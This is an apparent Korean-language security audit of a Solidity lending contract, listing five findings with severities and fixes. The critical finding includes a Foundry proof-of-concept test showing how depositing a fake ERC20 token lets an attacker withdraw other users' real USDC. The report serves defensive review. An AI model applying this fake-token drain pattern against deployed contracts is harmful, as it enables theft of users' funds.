# cml2ZXJjYXN0bGVvbmU=

## Scope

<table>
  <tr>
    <th>Name</th>
    <td>Lending Security Audit</td>
  </tr>
  <tr>
    <th>Target / Version</th>
    <td>Git Repository (<a href="https://bit.ly/4dQJagX" target="_blank">Lending_solidity</a>): commit <mark>ed0745f733124246d892e5433e5500e520936647</mark> (<mark>master</mark> branch)</td>
  </tr>
  <tr>
    <th>Application Type</th>
    <td>Smart contracts</td>
  </tr>
  <tr>
    <th>Lang. / Platforms</th>
    <td>Smart contracts [Solidity]</td>
  </tr>
</table>

## Findings

### #1 `001` Denial of service could occur due to spamming the `interest()` function

|ID|Summary|Severity|
|:---:|-------|:---:|
|001|`distributeInterest()` 함수 내부에 반복문을 통해 모든 이용자들의 예치 및 부채에 대한 값을 업데이트하는데, 공격자가 이를 활용해 *Denial of Service* 공격을 시도할 수 있음.|Low|

#### Description

`interest()` 함수에서 `distributeInterest()` 함수 호출 시 해당 함수 내에서 반복문을 통해 모든 이용자들의 예치 및 부채에 대한 값을 업데이트하는데, 공격자가 이를 활용해 Gas Cost가 상대적으로 저렴한 EVM 환경에서 해당 컨트랙트가 배포될 시에는 *Denial of Service* 공격을 시도할 수 있음. 특히, `getAccruedSupplyAmount()` 함수 등을 반복적으로 호출 시에 해당 컨트랙트 및 프로토콜 혼잡으로 인해 다른 이용자들의 원할한 이용이 방해될 수 있음.

#### Impact

**Low**

해당 컨트랙트를 대상으로한 *Denial of Service* 공격에 의한 정상적인 트랜잭션 처리 지연.

#### Recommendation

`interest()` 함수 등에서 실행 전에 `require` 문 삽입 등을 통해 반복적이거나 올바르지 않은 요청 차단.

### #2 `002` The interest rate is hard-coded

|ID|Summary|Severity|
|:---:|-------|:---:|
|002|이자율이 하드코드되어 있음.|Informational|

#### Description

해당 Lending 컨트랙트는 24시간 당, 0.1% 의 이자율이 적용되고, 12초에 1 블록이 생성되는 EVM 환경에서 배포됨. 이에, 1 블록당 이자율은 아래와 같은 식으로 계산됨.

$$ 1.001^{(1/7200)}×10^{18} = 1.00000013881950034147221897264156541137271898967894423311848... × 10^{18} $$

이에, `block_per_rate` 변수 값을 `1000000139000000000` 으로 하드코드하여 구현하였으나, 좀 더 *Floating Point* 이하 부분을 잘 반영하여 이자율을 적용할 수 있는 방법의 구현이 필요함

#### Impact

**Informational**

이자율의 괴리 발생.

#### Recommendation

*Floating Point* 이하 부분을 잘 반영하여 이자율을 적용할 수 있는 방법의 구현이 필요.

### #3 `003` No Mechanism to Remove Inactive `users`

|ID|Summary|Severity|
|:---:|-------|:---:|
|003|더 이상 해당 프로토콜을 사용하지 않는 유저가 `users` 변수에 삭제되지 않고 영구히 저장 됨.|Informational|

#### Description

유저가 유동성을 공급하게 되면, 해당 유저의 관리를 `users` 가변 배열 변수에서 `address` 타입으로 저장하여 관리하게 되는데, 더 이상 해당 프로토콜을 사용하지 않는 유저가 `users` 변수에 삭제되지 않고 영구히 저장 됨. 해당 변수는 `distributeInterest()` 함수 등에서 지속적으로 불러와 반복문으로 순회하게 되는데, 해당 변수에 많은 유저의 주소가 저장되면 해당 컨트랙트 이용에 점점 많은 가스비가 소모될 수 있음.

#### Impact

**Informational**

이용자가 증가할 수록 컨트랙트 스토리지 사용 증대로 인해 가스비 증가 및 부작용 발생.

#### Recommendation

특정 유저의 유동성 공급 등이 종료되면 `users` 변수에서 해당 유저의 주소를 제거.

### #4 `004` Success or failure is not checked in the *low-level call* within the `withdraw()` function

|ID|Summary|Severity|
|:---:|-------|:---:|
|004|`withdraw()` 함수에서, 유저에게 Ether를 출금할 때 최종적으로 *low-level call*을 이용하고 있는데, 성공 여부를 체크하지 않음.|Informational|

#### Description

`withdraw()` 함수에서, 유저에게 Ether를 출금할 때 최종적으로 *low-level call*을 이용하고 있는데, 성공 여부를 체크하지 않음. 이는, 해당 *low-level call*의 *Silently Fail*로 인해 유저가 정상적으로 Ether를 반환받지 못할 수 있고, 해당 트랜잭션의 Gas Estimation을 어렵게 할 수 있음.

#### Impact

**Informational**

이용자의 예기치 못한 출금 실패 및 자금 손실.

#### Recommendation

`(bool success, )` 및 `require(success)` 등의 성공 여부 체크 로직 도입 요망.

### #5 `005` Token address confirmation has not been performed

|ID|Summary|Severity|
|:---:|-------|:---:|
|005|해당 Lending Protocol 컨트랙트 전반에서, Ether와 함께 기초 담보 자산으로 사용되는 *USDC* 토큰 주소를 확인하지 않고, `deposit()`, `withdraw()`, `liquidate()` 등의 함수가 실행 및 수행을 통해 자금 탈취가 가능함.|Critical|

#### Description

`deposit()`, `withdraw()`, `liquidate()` 함수 등에서, 해당 함수가 다루는 자산이 Ether일 경우, `if (token == address(0x0))` 와 같은 분기를 통해 처리하는 데에 반해, 본 Lending Protocol의 또 다른 예치 및 대출 자산인 *USDC*에 대해서는 별도의 토큰 주소 검증없이, 이후에 `else` 문을 통해 모든 다른 토큰에 대해 동작하도록 설정 되어있음.

이 경우, 아래와 같이 ERC20 Compatible한 가짜 토큰을 생성하거나 기타 토큰을 통해 `deposit()` 함수를 실행하여, `depositUSDC`의 값을 증가 시킬 수 있으며, `withdraw()` 함수를 통해 실제 *USDC* 입금없이도 기예치된 *USDC*를 출금하는 식으로 탈취할 수 있음.

```solidity
function testExploit() external {
    vm.prank(victim);
    (bool success,) = address(lending).call(
        abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(usdc), 2000 ether)
    );
    assertTrue(success); // success true, victim deposited 2000 USDC value on the protocol.

    {
        vm.startPrank(exploiter);
        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.deposit.selector, address(usdcFake), 2000 ether)
        );
        assertTrue(success); // success true, fake USDC token address is given.

        (success,) = address(lending).call(
            abi.encodeWithSelector(DreamAcademyLending.withdraw.selector, address(usdc), 2000 ether)
        );
        assertTrue(success); // success true, Genuine USDC withdrawal is done to exploiter.
        vm.stopPrank();
    }
}
```

또, `liquidate()` 함수에서도 *USDC* 토큰에 대해 주소 검증을 하지 않으므로, 해당 함수를 통해서도 자금 탈취 가능.

#### Impact

**Critical**

Lending Protocol의 예치 토큰(USDC)의 전액 탈취 가능.

#### Recommendation

`require()` 문을 통해 인자로 주어지는 *token* 값이 *USDC* 주소와 일치하는지 검증 요망.